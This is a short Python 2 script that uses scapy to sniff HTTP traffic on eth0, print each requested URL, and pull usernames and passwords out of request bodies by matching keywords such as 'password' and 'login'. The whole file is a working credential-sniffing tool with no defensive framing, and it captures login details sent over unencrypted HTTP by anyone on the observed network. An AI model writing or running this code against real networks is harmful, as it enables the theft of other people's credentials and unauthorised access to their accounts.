#Python 2
import scapy.all as scapy
from scapy.layers import http
import re

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #iface = the interface, store = store or not store infromation in the memory, prn = call back function

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> \" " + url + " \"" + "\n")
        
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load #Where passwords and usernames are located
            keywords = ["username", "user", "login", "password", "pass", "b'uname", "uname", "logon", "Username", "User", "Login", "Password", "Pass", "B'Uname", "Uname", "Logon"]
            for keyword in keywords:
                if keyword in load:
                    username = re.search(r"name=\w+.\w\w\w+.\w+", load)
                    password_1 = re.search(r"pass=\w+", load)
                    password_2 = re.search(r"word=\w+", load)
                    print("\n[+] Possible username/password > " + load + "\n")
                    if username:
                        print("[+] Found an username: " + "user" + username.group(0))
                    if password_1:
                        print("[+] Found the password: " + password_1.group(0))
                        print("\n")
                    elif password_2:
                        print("[+] Found the password: " + "pass" + password_2.group(0))
                        print("\n")
                    break
                
sniff("eth0")
